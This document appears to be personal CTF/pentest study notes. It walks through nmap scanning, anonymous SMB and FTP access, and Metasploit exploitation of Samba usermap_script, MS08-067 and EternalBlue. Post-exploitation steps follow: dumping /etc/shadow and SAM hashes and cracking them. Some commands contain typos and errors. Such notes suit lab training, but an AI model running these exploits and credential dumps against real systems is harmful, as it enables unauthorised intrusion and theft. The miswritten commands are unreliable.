# pentest-notes
notes from ctf challenges
terminal commands start with a #
metasploit commands start with >

scanning process:
//# nmap -A -T4 -p- "ip" //or
//# nmap -sU -A -T4 -p- "ip" //udp
//# nmap -T4 -p- 'ip' // for faster results
//# nmap -A -T4 -p21, 80, 433 "ip" //specific ports

check host script results: ...

(does a syn -> syn ack -> rst)

finding open ports:

if running smb port 139/445:
//# smbclient -L \\ip\ or \\\\ip\\

root password can be anonymous
message signing: disbaled (dangerous, but default) 

if port 21 is open: service ftp:
ftp "ip"
un: anonymous
password: anonymous
ls
file can be uploaded in ftp server

look for anonymous ftp login: ok for internal server but bad for external facing servers
some ftp verison are buffer overflow vulnerable

if port 22 is open for ssh:
can be checked for bad passwords with brute force
brute force attacks should be picked up by the siem


if access shows file share list:
//# smbclient \\\\ip\\ADMIN$ //etc



if smbclient access failed: nt_status_invalid_parameter
do further enumeration with metasploit


search smb_version: if version smb version already given:
google exploits
//# msfconsole
//# systemctl postgresql enable
from rapid 7
> use exploit/multi/samba/usermap_script
> options
> set rhosts "ip"
> show targets
> run
> whoami //root highest for linux 
> hostname
> pwd
upadatedb
locate root.txt
cat /etc/passwd // has service account at top and user accounts in botton, password stored in shadow files x
cat /etc/shadow
use unshadow tool
//# gedit passwd
//# gedit shadow
//# unshadow
//# unshadow passwd shadow
x in passwd will be replaced by the hash in shadow
crack hash with hashcat


//# msfconsole
> search smb_version
> use auxiliary/scanner/smb/smb_version
auxiliary(scanner/smb/smb_version) > options
search for required 'yes' and no current setting enabled

if remote host:
auxiliary(scanner/smb/smb_version) > set rhosts "ip" or "ip/24" (for all machines in network)
rhost should be set to the ip
auxiliary(scanner/smb/smb_version) > run

research info found: for exploits
exploit db or rapid 7

in case windows xp sp3:
auxiliary(scanner/smb/smb_version) > use exploit/windows/smb/ms08_067_netapi
exploit(windows/smb/ms08_067_netapi) > options
exploit(windows/smb/ms08_067_netapi) > set rhosts "ip"
exploit(windows/smb/ms08_067_netapi) > show target

for automatic targetting:
exploit(windows/smb/ms08_067_netapi) > run

"meterpreter session 1 opened" (opened shell, accessed)
reverse shell (creates a listening port), have target connect back (usually internal)
bind shell connecting to the target (usuallyl external)



> getuid
nt authority\system = highest level else use getsystem command to elevate
> sysinfo
architecture should match the meterpreter shell eg x86

> help // to for all commands to do on an accesses machine

> hashdump //dumps sam->storing local user passwords crack hash with john the ripper or hash cat whole hash or part of hash seperated by : using crack map exec, ps exec

> shell (would give similar to windows cmd)
> cd c:\
> C:\>cd "documents and settings" 
> dir
> cd john
> dir
> cd Desktop
> type user.txt
for root text
C:\Documents and Settings>cd adminitrator\desktop
> type root.txt

looking for sensitive files:
meterpreter > pwd
cd c:\\
pwd
c:\
dir
--------------------------------------------------------------------------------------------------------------------------------------------

Checking for ms17-010 aka eternal blue via smb.
- Mostly found in internal pen tests.
- Allows for remote code executions and gains system access on a machine
- Rpc ports are common for smb
- Windows 7 professional 7601 service pack 1 (vulnerable to eternalblue)
- msfconsole
- search ms17-010
- use auxilary/scanner/smb/smb_ms17_010 (auxilaries are pre exploits) 
- set rhost 'ip'
- run to check if host is vulnerable
- use exploit/windows/smb/ms17_ms17_010_eternalblue
- set rhost 'ip'
- run
- for staged payload: set payload windows/x64/meterpreter/reverse_tcp
if win:
- whoami
- hostname
- getuid
- sysinfo
- hashdump
- shell
- route print
- arp -a
- netstat -ano CLOSE_WAIT and ESTABLISHED 
- 

- Auto blue can be used aswell for eternal blue
- netstat -ano , to check which process is communication is associated with eternal blue
- ps or tasklist for process list
- extra spoolsv.exe or lsass.exe can be indicators of eternal blue
--------------------------------------------------------------------------------------------------------------------------------------------


- linux passwords stored in /etc/shadow and /etc/passwd
- windows password storage, security account manager SAM file, C:\Windows\System32\Config, HKEY_ LOCAL_MACHINE\SAM -> registry
- ssh, brute force, SIEM and SOC should be able to detect it. if not , there are problems in the siem which have to be fixed
- linux log files: # cd /var/log .. dmesg | less .. view last 5 logs, tail -f -n 5 /var/log/syslog
- Windows , C:\> wevtutil /?
- ftp exploit can be used to upload malicious files to server
- / gives a staged payload
- '-' gives an unstaged payload

















